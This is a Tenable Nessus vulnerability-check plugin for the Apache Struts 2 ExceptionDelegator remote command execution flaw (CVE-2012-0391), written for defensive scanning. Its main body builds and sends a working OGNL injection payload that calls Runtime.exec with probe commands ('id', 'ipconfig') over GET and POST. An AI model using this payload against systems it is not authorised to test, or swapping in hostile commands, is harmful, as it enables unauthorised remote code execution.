#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69240);
  script_version("$Revision: 1.10 $");
  script_cvs_date("$Date: 2017/01/30 19:28:01 $");

  script_cve_id("CVE-2012-0391");
  script_osvdb_id(78277);

  script_name(english:"Apache Struts 2 ExceptionDelegator Arbitrary Remote Command Execution");
  script_summary(english:"Attempts to execute arbitrary commands.");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server contains a web application that uses a Java
framework that is affected by a remote command execution
vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web application appears to use Struts 2, a web framework
that utilizes OGNL (Object-Graph Navigation Language) as an expression
language. Due to an error in the way that the ExceptionDelegator
component handles mismatched data types, an unauthenticated, remote
attacker can execute arbitrary commands on the remote host by sending
a specially crafted request order. This flaw is due to the
ExceptionDelegator interpreting parameter values as OGNL expressions
when there is a conversion error. 

Note that this plugin will only report the first vulnerable instance
of a Struts 2 application."
  );
  # https://www.sec-consult.com/fxdata/seccons/prod/temedia/advisories_txt/20120104-0_Apache_Struts2_Multiple_Critical_Vulnerabilities.txt
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?828dc6d2");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-007.html");
  script_set_attribute(attribute:"see_also", value:"http://struts.apache.org/docs/s2-008.html");
  script_set_attribute(attribute:"solution", value:"Upgrade to version 2.2.3.1 or later.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:C/I:C/A:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Apache-Struts DebuggingInterceptor < 2.3.1.1 RCE Linux");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Apache Struts Remote Command Execution');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2011/08/05");
  script_set_attribute(attribute:"patch_publication_date", value:"2011/09/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/08/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:apache:struts");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2017 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl",  "os_fingerprint.nasl");
  script_require_ports("Services/www", 80, 8080);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http.inc");
include("misc_func.inc");
include("torture_cgi_func.inc");
include("url_func.inc");

port = get_http_port(default:8080);
cgis = get_kb_list('www/' + port + '/cgi');

urls = make_list();
# To identify actions that we can test the exploit on we will look
# for files with the .action / .jsp / .do suffix from the KB.
if (!isnull(cgis))
{
  foreach cgi (cgis)
  {
    match = eregmatch(pattern:"((^.*)(/.+\.act(ion)?)($|\?|;))", string:cgi);
    if (match)
    {
      urls = make_list(urls, match[0]);
      if (!thorough_tests) break;
    }
    match2 = eregmatch(pattern:"(^.*)(/.+\.jsp)$", string:cgi);
    if (!isnull(match2))
    {
      urls = make_list(urls, match2[0]);
      if (!thorough_tests) break;
    }
    match3 = eregmatch(pattern:"(^.*)(/.+\.do)$", string:cgi);
    if (!isnull(match3))
    {
      urls = make_list(urls, match3[0]);
      if (!thorough_tests) break;
    }
  }
}
if (thorough_tests)
{
  cgi2 = get_kb_list('www/' + port + '/content/extensions/act*');
  if (!isnull(cgi2)) urls = make_list(urls, cgi2);

  cgi3 = get_kb_list('www/' + port + '/content/extensions/jsp');
  if (!isnull(cgi3)) urls = make_list(urls, cgi3);

  cgi4 = get_kb_list('www/' + port + '/content/extensions/do');
  if (!isnull(cgi4)) urls = make_list(urls, cgi4);
}

if (max_index(urls) == 0)
  audit(AUDIT_WEB_FILES_NOT, "Struts 2 .action / .do / .jsp", port);

urls = list_uniq(urls);

# Determine which command to execute on target host
os = get_kb_item("Host/OS");
if (os && report_paranoia < 2)
{
  if ("Windows" >< os) cmd = 'ipconfig';
  else cmd = 'id';

  cmds = make_list(cmd);
}
else cmds = make_list('id', 'ipconfig');

vuln = FALSE;
foreach url (urls)
{
  # Grab CGI arguments for each .action file from KB
  cgi_args = get_cgi_arg_list(port:port, cgi:url);

  foreach cmd (cmds)
  {
    attack = "";
    exploit = "'+(#_memberAccess[" + '"allowStaticMethodAccess"]=true,' +
      "@java.lang.Runtime@getRuntime().exec('" + cmd + "'))+'";

    # Build a string with all CGI arguments set to the exploit string
    foreach arg (cgi_args)
    {
      attack += arg + "=" + exploit + "&";
    }
    attack = ereg_replace(string:attack, pattern:"&$", replace:"");
    attack_url = url + "?" + attack;

    # Try testing with GET first
    # attack_url should look like this example :
    # /dir/blah.action?param='+(#memberAccess["allowStaticMethodAccess"]=true,
    # @java.lang.Runtime@getRuntime().exec('id'))+'
    res = http_send_recv3(
      method : "GET",
      item   : attack_url,
      port   : port,
      exit_on_fail : TRUE
    );

    if (res[2] =~ 'value="java\\.lang\\.(UNIX)?Process(Impl)?@(.+)" id=')
    {
      vuln = TRUE;
      vuln_url = build_url(qs:attack_url, port:port);
      output = res[2];
      break;
    }

    # Else try testing with POST
    attack_post = urlencode(
      str        : attack,
      unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                   "56789=&_."
    );

    res2 = http_send_recv3(
      method : "POST",
      item   : url,
      data   : attack_post,
      port   : port,
      add_headers : make_array("Content-Type",
        "application/x-www-form-urlencoded"),
      exit_on_fail : TRUE
    );

    if (res2[2] =~ 'value="java\\.lang\\.(UNIX)?Process(Impl)?@(.+)" id=')
    {
      vuln = TRUE;
      vuln_url = http_last_sent_request();
      output = res2[2];
      break;
    }
  }
  # Stop after first vulnerable Struts app is found
  if (vuln) break;
}

if (!vuln) exit(0, 'No vulnerable applications were detected on the web server listening on port '+port+'.');

security_report_v4(
  port       : port,
  severity   : SECURITY_HOLE,
  generic    : TRUE,
  request    : make_list(vuln_url),
  output     : chomp(output)
);
